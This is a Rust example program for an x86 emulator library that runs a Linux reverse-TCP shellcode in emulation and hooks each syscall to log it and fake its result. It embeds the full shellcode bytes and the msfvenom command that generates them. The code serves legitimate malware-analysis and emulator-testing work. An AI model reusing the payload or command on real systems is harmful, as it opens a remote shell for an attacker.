//! Shellcode syscall interception demo.
//!
//! Loads a 74-byte Linux x86-64 reverse-TCP shellcode and runs it in flat
//! long mode. A `pre_syscall` hook intercepts every SYSCALL before its
//! architectural effects take place, logs the registers, spoofs a return
//! value in RAX, and returns `InstrAction::Skip` — so the CPU never actually
//! transitions to LSTAR (which would be 0 and execute garbage).
//!
//! ## Run
//!
//! ```bash
//! cargo run --release --example shellcode_trace --features "std,instrumentation"
//! ```

#![cfg(all(feature = "std", feature = "instrumentation"))]

use rusty_box::{
    cpu::{
        core_i7_skylake::Corei7SkylakeX,
        CpuSetupMode, HookCtx, HookMask, InstrAction, Instrumentation, ResetReason, X86Reg,
    },
    emulator::{Emulator, EmulatorConfig},
};

/// `msfvenom -p linux/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f raw`
/// socket → connect → dup2 ×3 → execve("/bin/sh", ...).
static SHELLCODE: &[u8] = &[
    0x6a, 0x29, 0x58, 0x99, 0x6a, 0x02, 0x5f, 0x6a, 0x01, 0x5e, 0x0f, 0x05, 0x48, 0x97,
    0x48, 0xb9, 0x02, 0x00, 0x11, 0x5c, 0x7f, 0x00, 0x00, 0x01, 0x51, 0x48, 0x89, 0xe6,
    0x6a, 0x10, 0x5a, 0x6a, 0x2a, 0x58, 0x0f, 0x05, 0x6a, 0x03, 0x5e, 0x48, 0xff, 0xce,
    0x6a, 0x21, 0x58, 0x0f, 0x05, 0x75, 0xf6, 0x6a, 0x3b, 0x58, 0x99, 0x48, 0xbb, 0x2f,
    0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00, 0x53, 0x48, 0x89, 0xe7, 0x52, 0x57, 0x48,
    0x89, 0xe6, 0x0f, 0x05,
];

const SHELLCODE_BASE: u64 = 0x0040_0000;
const STACK_TOP: u64 = 0x07FF_FF00; // inside the 128 MiB mapped region
const GUEST_RAM: usize = 128 * 1024 * 1024;

#[derive(Default)]
pub struct Tracer {
    syscalls: u32,
    next_fd: u64,
}

impl Instrumentation for Tracer {
    fn active_hooks(&self) -> HookMask { HookMask::empty() }

    fn pre_syscall(&mut self, ctx: &mut HookCtx) -> InstrAction {
        self.syscalls += 1;
        let nr = ctx.reg_read(X86Reg::Rax);
        let a0 = ctx.reg_read(X86Reg::Rdi);
        let a1 = ctx.reg_read(X86Reg::Rsi);
        let a2 = ctx.reg_read(X86Reg::Rdx);

        // Spoof a return value and decide whether to stop.
        let (retval, stop) = match nr {
            41 => { // socket — hand back a fake fd
                let fd = self.next_fd;
                self.next_fd += 1;
                (fd, false)
            }
            33 => (a1, false),       // dup2 → newfd
            59 => (0, true),         // execve → would exec, stop here
            _ => (0, false),         // everything else → success
        };

        tracing::info!(
            "syscall #{n:>3} nr={nr:<3} args=({a0:#x}, {a1:#x}, {a2:#x}) → rax={retval:#x}{stop}",
            n = self.syscalls,
            stop = if stop { " [STOP]" } else { "" },
        );

        ctx.reg_write(X86Reg::Rax, retval);
        if stop { InstrAction::SkipAndStop } else { InstrAction::Skip }
    }
}

fn main() -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
    std::thread::Builder::new()
        .stack_size(64 * 1024 * 1024)
        .name("shellcode".into())
        .spawn(run)
        .unwrap()
        .join()
        .unwrap()
}

fn run() -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
    tracing_subscriber::fmt()
        .with_max_level(tracing::Level::INFO)
        .with_target(false)
        .init();

    let cfg = EmulatorConfig {
        guest_memory_size: GUEST_RAM,
        host_memory_size: GUEST_RAM,
        ips: 1_000_000_000,
        pci_enabled: false,
        ..EmulatorConfig::default()
    };
    let tracer = Tracer { next_fd: 3, ..Default::default() };
    let mut emu = Emulator::<Corei7SkylakeX, Tracer>::new_with_instrumentation(cfg.clone(), tracer)?;
    emu.memory.init_memory(cfg.guest_memory_size, cfg.host_memory_size, cfg.memory_block_size)?;
    emu.memory.set_a20_mask(emu.pc_system.a20_mask());
    emu.pc_system.initialize(cfg.ips);
    emu.cpu.reset(ResetReason::Hardware);
    emu.setup_cpu_mode(CpuSetupMode::FlatLong64)?;

    emu.mem_write(SHELLCODE_BASE, SHELLCODE)?;
    emu.reg_write(X86Reg::Rsp, STACK_TOP);

    tracing::info!("Loaded {} bytes at {SHELLCODE_BASE:#x}", SHELLCODE.len());
    let reason = emu.emu_start(SHELLCODE_BASE, None, None, Some(10_000))?;
    tracing::info!("Stopped: {reason:?}, {} syscalls intercepted", emu.instrumentation().syscalls);
    Ok(())
}
